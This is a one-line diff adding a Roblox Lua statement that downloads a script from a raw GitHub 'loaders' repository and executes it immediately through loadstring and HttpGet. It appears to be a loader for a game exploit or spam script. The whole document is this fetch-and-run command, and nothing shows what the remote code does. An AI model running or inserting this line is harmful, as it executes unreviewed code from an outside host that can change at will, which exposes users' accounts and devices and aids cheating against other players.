@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/the-eternal-abyss-spam1-ckktn8jaoci4zn.lua"))()
